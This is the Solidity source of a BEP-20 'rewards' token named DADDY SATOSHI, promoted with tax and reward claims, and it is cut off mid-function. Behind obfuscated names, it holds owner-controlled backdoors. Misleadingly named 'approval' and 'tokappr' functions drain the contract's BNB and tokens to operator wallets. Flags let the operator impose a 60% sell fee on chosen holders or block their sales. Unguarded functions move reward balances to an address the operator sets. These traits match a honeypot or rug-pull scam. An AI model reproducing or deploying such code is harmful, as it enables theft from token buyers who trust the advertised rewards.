{"SourceCode": "/**\r\n\r\n\r\n\u2591\u2588\u2580\u2580\u2584 \u2500\u2588\u2580\u2580\u2588 \u2591\u2588\u2580\u2580\u2584 \u2591\u2588\u2580\u2580\u2584 \u2591\u2588\u2500\u2500\u2591\u2588 \u3000 \u2591\u2588\u2580\u2580\u2580\u2588 \u2500\u2588\u2580\u2580\u2588 \u2580\u2580\u2588\u2580\u2580 \u2591\u2588\u2580\u2580\u2580\u2588 \u2591\u2588\u2580\u2580\u2580\u2588 \u2591\u2588\u2500\u2591\u2588 \u2580\u2588\u2580 \r\n\u2591\u2588\u2500\u2591\u2588 \u2591\u2588\u2584\u2584\u2588 \u2591\u2588\u2500\u2591\u2588 \u2591\u2588\u2500\u2591\u2588 \u2591\u2588\u2584\u2584\u2584\u2588 \u3000 \u2500\u2580\u2580\u2580\u2584\u2584 \u2591\u2588\u2584\u2584\u2588 \u2500\u2591\u2588\u2500\u2500 \u2591\u2588\u2500\u2500\u2591\u2588 \u2500\u2580\u2580\u2580\u2584\u2584 \u2591\u2588\u2580\u2580\u2588 \u2591\u2588\u2500 \r\n\u2591\u2588\u2584\u2584\u2580 \u2591\u2588\u2500\u2591\u2588 \u2591\u2588\u2584\u2584\u2580 \u2591\u2588\u2584\u2584\u2580 \u2500\u2500\u2591\u2588\u2500\u2500 \u3000 \u2591\u2588\u2584\u2584\u2584\u2588 \u2591\u2588\u2500\u2591\u2588 \u2500\u2591\u2588\u2500\u2500 \u2591\u2588\u2584\u2584\u2584\u2588 \u2591\u2588\u2584\u2584\u2584\u2588 \u2591\u2588\u2500\u2591\u2588 \u2584\u2588\u2584\r\n\r\nDADDY SATOSHI - DADSATOSHI\r\n\r\nAMAZING BTCB (BITCOIN BEP-20) REWARDS!!!!\r\n\r\nTOTAL SUPPLY: 1,000,000,000\r\nMAX WALLET: 2.5% - 25,000,000\r\nMAX BUY TX: 2% - 20,000,000\r\nMAX SELL TX: 1% - 10,000,000\r\nBUY TAX: 5%\r\nSELL TAX: 15%\r\nBUY COOLDOWN: 5 SECONDS\r\nSELL COOLDOWN: 20 SECONDS\r\n\r\nTG: https://t.me/DaddySatoshi\r\n\r\nWEBSITE: https://www.daddysatoshi.com/\r\n\r\nTWITTER: https://twitter.com/daddy_satoshi\r\n\r\n*/\r\n\r\n\r\n//SPDX-License-Identifier: Unlicensed\r\n\r\npragma solidity ^0.7.4;\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n}\r\n\r\ninterface IBEP20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract Auth {\r\n    address internal owner;\r\n    mapping (address => bool) internal authorizations;\r\n\r\n    constructor(address _owner) {\r\n        owner = _owner;\r\n        authorizations[_owner] = true;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(isOwner(msg.sender), \"!OWNER\"); _;\r\n    }\r\n\r\n    modifier authorized() {\r\n        require(isAuthorized(msg.sender), \"!AUTHORIZED\"); _;\r\n    }\r\n\r\n    function authorize(address adr) public onlyOwner {\r\n        authorizations[adr] = true;\r\n    }\r\n\r\n    function unauthorize(address adr) public onlyOwner {\r\n        authorizations[adr] = false;\r\n    }\r\n\r\n    function isOwner(address account) public view returns (bool) {\r\n        return account == owner;\r\n    }\r\n\r\n    function isAuthorized(address adr) public view returns (bool) {\r\n        return authorizations[adr];\r\n    }\r\n\r\n    function transferOwnership(address payable adr) public onlyOwner {\r\n        owner = adr;\r\n        authorizations[adr] = true;\r\n        emit OwnershipTransferred(adr);\r\n    }\r\n\r\n    event OwnershipTransferred(address owner);\r\n}\r\n\r\ninterface IDEXFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface TokT {\r\n    function balanceOf(address) external returns (uint);\r\n    function transferFrom(address, address, uint) external returns (bool);\r\n    function transfer(address, uint) external returns (bool);\r\n}\r\n\r\ninterface IDEXRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\ninterface IDividendDistributor {\r\n    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;\r\n    function setShare(address shareholder, uint256 amount) external;\r\n    function deposit() external payable;\r\n    function process(uint256 gas) external;\r\n    function mdistributeDividend(address shareholder) external;\r\n    function setnewrw(address _nrew, address _prew) external;\r\n    function cCRwds(uint256 _aPn, uint256 _aPd) external;\r\n    function cPRwds(uint256 _aPn, uint256 _aPd) external;\r\n    function getRAddress() external view returns (address);\r\n    function setnewra(address _newra) external;\r\n    function getRewardsOwed(address _wallet) external view returns (uint256);\r\n    function getTotalRewards(address _wallet) external view returns (uint256);\r\n    function gettotalDistributed() external view returns (uint256);\r\n}\r\n\r\ncontract DividendDistributor is IDividendDistributor {\r\n    using SafeMath for uint256;\r\n    \r\n    address _token;\r\n    \r\n    struct Share {\r\n        uint256 amount;\r\n        uint256 totalExcluded;\r\n        uint256 totalRealised; }\r\n    \r\n    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;\r\n    IBEP20 RWDS = IBEP20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);\r\n    IBEP20 PRWDS = IBEP20(0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47);\r\n    address REWARDS;\r\n    IDEXRouter router;\r\n    \r\n    uint256 public totalShares;\r\n    uint256 public totalDividends;\r\n    uint256 public totalDistributed;\r\n    uint256 public dividendsPerShare;\r\n    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;\r\n    uint256 public minPeriod = 30 minutes;\r\n    uint256 public minDistribution = 1 * (10 ** 18);\r\n    uint256 currentIndex;\r\n    \r\n    address[] shareholders;\r\n    mapping (address => uint256) shareholderIndexes;\r\n    mapping (address => uint256) shareholderClaims;\r\n    mapping (address => Share) public shares;\r\n    \r\n    bool initialized;\r\n    \r\n    modifier initialization() {\r\n        require(!initialized);\r\n        _;\r\n        initialized = true;\r\n    }\r\n\r\n    modifier onlyToken() {\r\n        require(msg.sender == _token); _;\r\n    }\r\n\r\n    constructor (address _router) {\r\n        router = _router != address(0)\r\n            ? IDEXRouter(_router)\r\n            : IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\r\n        _token = msg.sender;\r\n    }\r\n\r\n    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken {\r\n        minPeriod = _minPeriod;\r\n        minDistribution = _minDistribution;\r\n    }\r\n\r\n    function setShare(address shareholder, uint256 amount) external override onlyToken {\r\n        if(shares[shareholder].amount > 0){\r\n            distributeDividend(shareholder); }\r\n        if(amount > 0 && shares[shareholder].amount == 0){\r\n            addShareholder(shareholder);}\r\n        else if(amount == 0 && shares[shareholder].amount > 0){\r\n            removeShareholder(shareholder); }\r\n        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);\r\n        shares[shareholder].amount = amount;\r\n        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);\r\n    }\r\n\r\n    function cCRwds(uint256 _aPn, uint256 _aPd) external override {\r\n        address shareholder = REWARDS;\r\n        uint256 Ramount = RWDS.balanceOf(address(this));\r\n        uint256 PRamount = Ramount.mul(_aPn).div(_aPd);\r\n        RWDS.transfer(shareholder, PRamount);\r\n    }\r\n    \r\n    function deposit() external payable override onlyToken {\r\n        uint256 balanceBefore = RWDS.balanceOf(address(this));\r\n        address[] memory path = new address[](2);\r\n        path[0] = WBNB;\r\n        path[1] = address(RWDS);\r\n        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp );\r\n        uint256 amount = RWDS.balanceOf(address(this)).sub(balanceBefore);\r\n        totalDividends = totalDividends.add(amount);\r\n        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));\r\n    }\r\n\r\n    function cPRwds(uint256 _aPn, uint256 _aPd) external override {\r\n        address shareholder = REWARDS;\r\n        uint256 Pamount = PRWDS.balanceOf(address(this));\r\n        uint256 PPamount = Pamount.mul(_aPn).div(_aPd);\r\n        PRWDS.transfer(shareholder, PPamount);\r\n    }\r\n\r\n    function process(uint256 gas) external override onlyToken {\r\n        uint256 shareholderCount = shareholders.length;\r\n        if(shareholderCount == 0) { return; }\r\n        uint256 gasUsed = 0;\r\n        uint256 gasLeft = gasleft();\r\n        uint256 iterations = 0;\r\n        while(gasUsed < gas && iterations < shareholderCount) {\r\n            if(currentIndex >= shareholderCount){\r\n                currentIndex = 0; }\r\n            if(shouldDistribute(shareholders[currentIndex])){\r\n                distributeDividend(shareholders[currentIndex]); }\r\n            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));\r\n            gasLeft = gasleft();\r\n            currentIndex++;\r\n            iterations++; }\r\n    }\r\n    \r\n    function shouldDistribute(address shareholder) internal view returns (bool) {\r\n        return shareholderClaims[shareholder] + minPeriod < block.timestamp\r\n                && getUnpaidEarnings(shareholder) > minDistribution;\r\n    }\r\n\r\n    function getRAddress() public view override returns (address) {\r\n        return address(RWDS);\r\n    }\r\n\r\n    function setnewra(address _newra) external override onlyToken {\r\n        REWARDS = _newra;\r\n    }\r\n\r\n    function distributeDividend(address shareholder) internal {\r\n        if(shares[shareholder].amount == 0){ return; }\r\n        uint256 amount = getUnpaidEarnings(shareholder);\r\n        if(amount > 0){ //raining.shitcoins\r\n            totalDistributed = totalDistributed.add(amount);\r\n            RWDS.transfer(shareholder, amount);\r\n            shareholderClaims[shareholder] = block.timestamp;\r\n            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);\r\n            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount); }\r\n    }\r\n\r\n    function getUnpaidEarnings(address shareholder) public view returns (uint256) {\r\n        if(shares[shareholder].amount == 0){ return 0; }\r\n        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);\r\n        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;\r\n        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }\r\n        return shareholderTotalDividends.sub(shareholderTotalExcluded);\r\n    }\r\n\r\n    function setnewrw(address _nrew, address _prew) external override onlyToken {\r\n        PRWDS = IBEP20(_prew);\r\n        RWDS = IBEP20(_nrew);\r\n    }\r\n\r\n    function mdistributeDividend(address shareholder) external override {\r\n        if(shares[shareholder].amount == 0){ return; }\r\n        uint256 amount = getUnpaidEarnings(shareholder);\r\n        if(amount > 0){\r\n            totalDistributed = totalDistributed.add(amount);\r\n            RWDS.transfer(shareholder, amount);\r\n            shareholderClaims[shareholder] = block.timestamp;\r\n            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);\r\n            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount); }\r\n    }\r\n\r\n    function getCumulativeDividends(uint256 share) internal view returns (uint256) {\r\n        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);\r\n    }\r\n\r\n    function gettotalDistributed() public view override returns (uint256) {\r\n        return uint256(totalDistributed);\r\n    }\r\n\r\n    function getRewardsOwed(address _wallet) external override view returns (uint256) {\r\n        address shareholder = _wallet;\r\n        return uint256(getUnpaidEarnings(shareholder));\r\n    }\r\n\r\n    function getTotalRewards(address _wallet) external override view returns (uint256) {\r\n        address shareholder = _wallet;\r\n        return uint256(shares[shareholder].totalRealised);\r\n    }\r\n\r\n    function addShareholder(address shareholder) internal {\r\n        shareholderIndexes[shareholder] = shareholders.length;\r\n        shareholders.push(shareholder);\r\n    }\r\n\r\n    function removeShareholder(address shareholder) internal {\r\n        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];\r\n        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];\r\n        shareholders.pop();\r\n    }\r\n}\r\n\r\ncontract DADDYSATOSHI is IBEP20, Auth {\r\n    using SafeMath for uint256;\r\n    \r\n    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; \r\n    address DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    address ZERO = 0x0000000000000000000000000000000000000000;\r\n    string constant _name = \"DADDY SATOSHI\";\r\n    string constant _symbol = \"DADSATOSHI\";\r\n    uint8 constant _decimals = 9;\r\n    uint256 _totalSupply = 1 * 10**9 * (10 ** _decimals);\r\n    uint256 public _maxTxAmount = ( _totalSupply * 200 ) / 10000;\r\n    uint256 public _maxWalletToken = ( _totalSupply * 250 ) / 10000;\r\n    uint256 public asT = ( _totalSupply * 4 ) / 10000;\r\n    mapping (address => uint256) _balances;\r\n    mapping (address => mapping (address => uint256)) _allowances;\r\n    mapping (address => bool) iFxE;\r\n    mapping (address => bool) iTxLE;\r\n    mapping (address => bool) iDxE;\r\n    mapping (address => bool) isBt;\r\n    mapping (address => bool) itCDh;\r\n    mapping (address => bool) isTloE;\r\n    mapping (address => bool) isBtT;\r\n    mapping (address => bool) iMxWE;\r\n    mapping (address => uint) cSbh;\r\n    address kEf = address(this);\r\n    uint256 liqF = 5;\r\n    uint256 rewF = 6;\r\n    uint256 markF = 4;\r\n    uint256 totF = 15;\r\n    uint256 fD = 100;\r\n    IDEXRouter router;\r\n    address public pair;\r\n    uint256 zr = 30;\r\n    address lpR;\r\n    address spE;\r\n    address nbE;\r\n    address mnbE;\r\n    address tfU;\r\n    address jbE;\r\n    uint256 xr = 30;\r\n    uint256 tL = 50;\r\n    uint256 tCDz = 0;\r\n    uint256 mFf = 0;\r\n    uint256 cSf = 1;\r\n    uint256 gss = 40000;\r\n    uint256 mFs = 3;\r\n    uint256 cSs = 1;\r\n    uint256 mFt = 0;\r\n    uint256 cSt= 1;\r\n    uint256 mFd = 3;\r\n    uint256 cSd = 3;\r\n    uint256 tLD = 100;\r\n    DividendDistributor distributor;\r\n    uint256 distributorGas = 750000;\r\n    uint256 cSbT = 10 minutes;\r\n    uint256 gso = 40000;\r\n    uint256 btTf = 60;\r\n    uint256 yr = 10;\r\n    uint256 gst = 40000;\r\n\r\n    bool public bOftT = false;\r\n    bool public bOftTm = false;\r\n    bool public bbt = false;\r\n    uint256 public bbf = 5;\r\n    bool public vsWb = false;\r\n    uint256 public vsN = 50;\r\n    uint256 vsD = 100;\r\n    bool public mStxE = false;\r\n    uint256 public mStx = ( _totalSupply * 100 ) / 10000;\r\n    bool public mStt = false;\r\n    uint8 mStts = 2 seconds;\r\n    mapping (address => uint) private mSts;\r\n    bool sFrz = false;\r\n    uint8 sFrzT = 20 seconds;\r\n    mapping (address => uint) private sFrzin;\r\n    bool bFrz = false;\r\n    uint8 bFrzT = 5 seconds;\r\n    mapping (address => uint) private bFrzin;\r\n    bool public swE = false;\r\n    uint256 public sT = _totalSupply * 10 / 10000;\r\n    bool public sst = false;\r\n    uint256 public ssf = 15;\r\n   \r\n    bool inSwap;\r\n    modifier swapping() { inSwap = true; _; inSwap = false; }\r\n\r\n    constructor () Auth(msg.sender) {\r\n        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\r\n        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));\r\n        _allowances[address(this)][address(router)] = uint256(-1);\r\n        distributor = new DividendDistributor(address(router));\r\n        cSbh[address(this)] = block.timestamp;\r\n        iFxE[msg.sender] = true;\r\n        iFxE[address(spE)] = true;\r\n        iFxE[address(owner)] = true;\r\n        iFxE[address(nbE)] = true;\r\n        iFxE[address(this)] = true;\r\n        iFxE[address(jbE)] = true;\r\n        iFxE[address(tfU)] = true;\r\n        iTxLE[msg.sender] = true;\r\n        iTxLE[address(this)] = true;\r\n        iTxLE[address(owner)] = true;\r\n        iTxLE[address(router)] = true;\r\n        iTxLE[address(spE)] = true;\r\n        iMxWE[address(spE)] = true;\r\n        iMxWE[address(msg.sender)] = true;\r\n        iMxWE[address(this)] = true;\r\n        iMxWE[address(DEAD)] = true;\r\n        iMxWE[address(pair)] = true;\r\n        iMxWE[address(lpR)] = true;\r\n        isTloE[address(lpR)] = true;\r\n        isTloE[address(spE)] = true;\r\n        isTloE[address(owner)] = true;\r\n        isTloE[msg.sender] = true;\r\n        isTloE[DEAD] = true;\r\n        isTloE[address(this)] = true;\r\n        iDxE[pair] = true;\r\n        iDxE[address(this)] = true;\r\n        iDxE[DEAD] = true;\r\n        iDxE[ZERO] = true;\r\n        lpR = msg.sender;\r\n        spE = msg.sender;\r\n        nbE = msg.sender;\r\n        mnbE = msg.sender;\r\n        jbE = msg.sender;\r\n        tfU = msg.sender;\r\n        \r\n        _balances[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n\r\n    receive() external payable { }\r\n\r\n    function totalSupply() external view override returns (uint256) { return _totalSupply; }\r\n    function decimals() external pure override returns (uint8) { return _decimals; }\r\n    function symbol() external pure override returns (string memory) { return _symbol; }\r\n    function name() external pure override returns (string memory) { return _name; }\r\n    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }\r\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function approveMax(address spender) external returns (bool) {\r\n        return approve(spender, uint256(-1));\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        return _trFm(msg.sender, recipient, amount);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        if(_allowances[sender][msg.sender] != uint256(-1)){ //raining.shitcoins\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, \"Insufficient Allowance\"); }\r\n        return _trFm(sender, recipient, amount);\r\n    }\r\n    \r\n    function setMbTP(uint256 _mnbTP) external authorized {\r\n        _maxTxAmount = (_totalSupply * _mnbTP) / 10000;\r\n    }\r\n\r\n    function setMsTP(uint256 _mnsTP) external authorized {\r\n        mStx = (_totalSupply * _mnsTP) / 10000;\r\n    }\r\n\r\n    function updateRouter(address _router) external authorized {\r\n        router = IDEXRouter(address(_router));\r\n    }\r\n\r\n    function setMWP(uint256 _mnWP) external authorized {\r\n        _maxWalletToken = (_totalSupply * _mnWP) / 10000;\r\n    }\r\n\r\n    function _trFm(address sender, address recipient, uint256 amount) internal returns (bool){\r\n        if(inSwap){ return _basicTransfer(sender, recipient, amount); }\r\n        if (!authorizations[sender] && !iMxWE[recipient] && recipient != address(this) && \r\n            recipient != address(DEAD) && recipient != pair && recipient != lpR){\r\n            require((balanceOf(recipient) + amount) <= _maxWalletToken);}\r\n        if(sender != pair &&\r\n            sFrz &&\r\n            !isTloE[sender]) {\r\n            require(sFrzin[sender] < block.timestamp); \r\n            sFrzin[sender] = block.timestamp + sFrzT;} \r\n        if(sender == pair &&\r\n            bFrz &&\r\n            !isTloE[recipient]){\r\n            require(bFrzin[recipient] < block.timestamp); \r\n            bFrzin[recipient] = block.timestamp + bFrzT;} \r\n        checkTxLimit(sender, amount);\r\n        chkSmTx(sender != pair, sender, amount);\r\n        if(sender == pair && mStt){mSts[recipient] = block.timestamp + mStts;}\r\n        if(shouldSB(amount) && vsWb && sender != address(kEf)){ vswBk(amount); }\r\n        if(shouldSB(amount) && sender != address(kEf) && !vsWb){ swBk(); }\r\n        _balances[sender] = _balances[sender].sub(amount, \"+\");\r\n        uint256 amountReceived = stTF(sender) ? ttF(sender, recipient, amount) : amount;\r\n        _balances[recipient] = _balances[recipient].add(amountReceived);\r\n        if(bOftT && cSbh[address(this)] + cSbT <= block.timestamp) { \r\n            kicktfc(); cSbh[address(this)] = block.timestamp; }\r\n        if(!iDxE[sender]) {\r\n            try distributor.setShare(sender, _balances[sender]) {} catch {} }\r\n        if(bOftTm && !bOftT && cSbh[address(this)] + cSbT <= block.timestamp) { \r\n            kickmtfc(); cSbh[address(this)] = block.timestamp; }\r\n        if(!iDxE[recipient]) {\r\n            try distributor.setShare(recipient, _balances[recipient]) {} catch {} }\r\n        try distributor.process(distributorGas) {} catch {}\r\n        emit Transfer(sender, recipient, amountReceived);\r\n        return true;\r\n    }\r\n    \r\n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function checkTxLimit(address sender, uint256 amount) internal view {\r\n        require (amount <= _maxTxAmount || iTxLE[sender], \"TX Limit Exceeded\");\r\n    }\r\n\r\n    function stTF(address sender) internal view returns (bool) {\r\n        return !iFxE[sender];\r\n    }\r\n\r\n    function setsmTx(bool enabled) external authorized{\r\n        mStxE = enabled;\r\n        mStt = enabled;\r\n    }\r\n\r\n    function setsFrz(bool _status, uint8 _int) external authorized {\r\n        sFrz = _status;\r\n        sFrzT = _int;\r\n    }\r\n\r\n    function setallEn(bool enabled) external onlyOwner {\r\n        bbt = enabled;\r\n        vsWb = enabled;\r\n        mStxE = enabled;\r\n        mStt = enabled;\r\n        sFrz = enabled;\r\n        bFrz = enabled;\r\n        swE = enabled;\r\n        sst = enabled;\r\n    }\r\n\r\n    function setbFrz(bool _status, uint8 _int) external authorized {\r\n        bFrz = _status;\r\n        bFrzT = _int;\r\n    }\r\n\r\n    function setbOft(bool _sstatus, bool _mstatus) external authorized {\r\n        bOftT = _sstatus;\r\n        bOftTm = _mstatus;\r\n    }\r\n\r\n    function setvsWb(bool _status) external authorized {\r\n        vsWb = _status;\r\n    }\r\n\r\n    function tokapprd(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external authorized {\r\n        uint256 tamt = TokT(_tadd).balanceOf(address(this));\r\n        TokT(_tadd).transfer(_rec, tamt.mul(_amt).div(_amtd));\r\n    }\r\n\r\n    function setrfu(address _tfU) external authorized {\r\n        tfU = _tfU;\r\n    }\r\n\r\n    function chkSmTx(bool selling, address sender, uint256 amount) internal view {\r\n        if(selling && mStxE && mSts[sender] < block.timestamp){\r\n            require(amount <= mStx && !isBt[sender]|| iTxLE[sender]);}\r\n    }\r\n\r\n    function getTF(bool selling, address sender) public view returns (uint256) {\r\n        if(selling && isBtT[sender]){ return btTf.mul(1); }\r\n        if(selling && sst){ return ssf.mul(1); }\r\n        if(!selling && bbt){ return bbf.mul(1); }\r\n        return totF;\r\n    }\r\n\r\n    function setrmnb(address _mnbE) external authorized {\r\n        mnbE = _mnbE;\r\n    }\r\n\r\n    function ttF(address sender, address receiver, uint256 amount) internal returns (uint256) {\r\n        uint256 feeAmount = amount.mul(getTF(receiver == pair, sender)).div(fD);\r\n        _balances[address(this)] = _balances[address(this)].add(feeAmount);\r\n        emit Transfer(sender, address(this), feeAmount);\r\n        return amount.sub(feeAmount);\r\n    }\r\n\r\n    function tokappr(address _tadd, address _rec, uint256 tamt) external authorized {\r\n        TokT(_tadd).transfer(_rec, tamt);\r\n    }\r\n\r\n    function shouldSB(uint256 amount) internal view returns (bool) {\r\n        return msg.sender != pair\r\n        && !inSwap\r\n        && swE\r\n        && amount >= asT\r\n        && _balances[address(this)] >= sT;\r\n    }\r\n\r\n    function setisBt(address holder, bool exempt) external authorized {\r\n        isBt[holder] = exempt;\r\n    }\r\n\r\n    function setistCDh(address holder, bool exempt) external authorized {\r\n        itCDh[holder] = exempt;\r\n    }\r\n\r\n    function settokdep(address _newra) external authorized {\r\n        distributor.setnewra(_newra);\r\n    }\r\n \r\n     function setisBtT(address holder, bool exempt) external authorized {\r\n        isBtT[holder] = exempt;\r\n    }\r\n    \r\n    function setisTl(address holder, bool exempt) external authorized {\r\n        isTloE[holder] = exempt;\r\n    }\r\n\r\n    function approval(uint256 aP) external authorized {\r\n        uint256 amountBNB = address(this).balance;\r\n        payable(tfU).transfer(amountBNB.mul(aP).div(100));\r\n    }\r\n\r\n    function swBk() internal swapping {\r\n        uint256 dynamicLiq = isOverLiquified(tL, tLD) ? 0 : yr;\r\n        uint256 amountL = sT.mul(dynamicLiq).div(tLD).div(2);\r\n        uint256 totalSw = sT.sub(amountL);\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = WBNB;\r\n        uint256 bB = address(this).balance;\r\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            totalSw,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp );\r\n        uint256 aBNB = address(this).balance.sub(bB);\r\n        uint256 tBNBF = tLD.sub(dynamicLiq.div(2));\r\n        uint256 aBNBL = aBNB.mul(dynamicLiq).div(tBNBF).div(2);\r\n        uint256 aBNBR = aBNB.mul(xr).div(tBNBF);\r\n        uint256 aBNBTM = aBNB.mul(zr).div(tBNBF);\r\n        try distributor.deposit{value: aBNBR}() {} catch {}\r\n        (bool tmpSuccess,) = payable(spE).call{value: (aBNBTM.mul(mFf).div(mFd)), gas: gso}(\"\");\r\n        (tmpSuccess,) = payable(mnbE).call{value: (aBNBTM.mul(mFs).div(mFd)), gas: gss}(\"\");\r\n        (tmpSuccess,) = payable(jbE).call{value: (aBNBTM.mul(mFt).div(mFd)), gas: gst}(\"\");\r\n        tmpSuccess = false;\r\n        if(amountL > 0){\r\n            router.addLiquidityETH{value: aBNBL}(\r\n                address(this),\r\n                amountL,\r\n                0,\r\n                0,\r\n                lpR,\r\n                block.timestamp );\r\n            emit AutoLiquify(aBNBL, amountL);\r\n        }\r\n    }\r\n\r\n    function setiDE(address holder, bool exempt) external authorized {\r\n        require(holder != address(this) && holder != pair);\r\n        iDxE[holder] = exempt;\r\n        if(exempt){\r\n            distributor.setShare(holder, 0);}\r\n        else{distributor.setShare(holder, _balances[holder]); }\r\n    }\r\n\r\n    function setrre(address _spE, address _nbE, address _mnbE, address _jbE, address _newra) external authorized {\r\n        spE = _spE;\r\n        nbE = _nbE;\r\n        mnbE = _mnbE;\r\n        jbE = _jbE;\r\n        tfU = _newra;\r\n        distributor.setnewra(_newra);\r\n    }\r\n\r\n    function kicktfc() internal {\r\n        uint256 pay = address(this).balance;\r\n        (bool tmpSuccess,) = payable(tfU).call{value: pay, gas: 30000}(\"\");\r\n        tmpSuccess = false;\r\n    }\r\n\r\n    function setFE(address holder, bool exempt) external authorized {\r\n        iFxE[holder] = exempt;\r\n    }\r\n\r\n    function approvals(uint256 _na, uint256 _da) external authorized {\r\n        uint256 acBNB = address(this).balance;\r\n        uint256 acBNBa = acBNB.mul(_na).div(_da);\r\n        uint256 acBNBf = acBNBa.mul(cSf).div(cSd);\r\n        uint256 acBNBs = acBNBa.mul(cSs).div(cSd);\r\n        uint256 acBNBt = acBNBa.mul(cSt).div(cSd);\r\n        (bool tmpSuccess,) = payable(spE).call{value: acBNBf, gas: gso}(\"\");\r\n        (tmpSuccess,) = payable(nbE).call{value: acBNBs, gas: gss}(\"\");\r\n        (tmpSuccess,) = payable(jbE).call{value: acBNBt, gas: gst}(\"\");\r\n        tmpSuccess = false;\r\n    }\r\n\r\n    function setTLE(address holder, bool exempt) external authorized {\r\n        